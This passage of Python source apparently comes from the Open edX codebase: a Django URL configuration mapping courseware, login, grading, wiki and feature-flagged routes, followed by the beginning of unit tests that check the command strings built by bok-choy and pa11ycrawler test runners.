if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name="foldit_ops"),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name="hint_manager"),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'

from django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name="root"),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name="dashboard"),
    url(r'^login$', 'student.views.signin_user', name="signin_user"),
    url(r'^register$', 'student.views.register_user', name="register_user"),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name="change_email"),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name="change_name"),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name="accounts_login"),

    url(r'^login_ajax$', 'student.views.login_user', name="login"),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name="activate"),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name="begin_exam_registration"),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name="university_profile"),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name="404"),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name="jobs"),
        url(r'^press$', 'student.views.press', name="press"),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name="media-kit"),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name="faq_edx"),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name="help_edx"),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name="copyright"),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == "ROOT" or key == "COURSES" or key == "FAQ":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = "%s.html" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
        template = "theme-" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name="course_wiki"),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name="jump_to"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name="user_software_license"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name="courses"),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name="change_enrollment"),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name="about_course"),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name="course_root"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name="info"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name="syllabus"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.index', name="book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index', name="pdf_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index', name="pdf_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name="courseware"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name="courseware_chapter"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name="courseware_section"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name="courseware_position"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name="progress"),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name="student_progress"),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name="instructor_dashboard"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name="cohorts"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name="add_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name="list_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name="add_to_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name="remove_from_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name="debug_cohort_mgmt"),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name="masquerade-switch"),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name="news"),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name="static_tab"),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name="foldit_ops"),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name="hint_manager"),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'

"""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
"""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """
    Paver Bok Choy Command test cases
    """

    def _expected_command(self, name, store=None, verify_xss=False):                    
        """
        Returns the command that is expected to be run for the given test spec
        and store.
        """

        expected_statement = (
            "DEFAULT_STORE={default_store} "
            "SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' "
            "BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' "
            "BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' "
            "SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' "
            "VERIFY_XSS='{verify_xss}' "
            "nosetests {repo_dir}/common/test/acceptance/{exp_text} "
            "--with-xunit "
            "--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml "
            "--verbosity=2 "
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, "")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))                    

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'True')                    
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))                    

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """
        expected_verbosity_string = (
            "--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """
        process_count = 2
        expected_verbosity_string = (
            "--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml"
            " --processes={procs} --no-color --process-timeout=1200".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """
        With the above test, validate that num_processes can be set to various values
        """
        process_count = 3
        expected_verbosity_string = (
            "--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml"
            " --processes={procs} --no-color --process-timeout=1200".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """
        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """
        Returns the expected command to run pa11ycrawler.
        """
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter="1.0-json" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
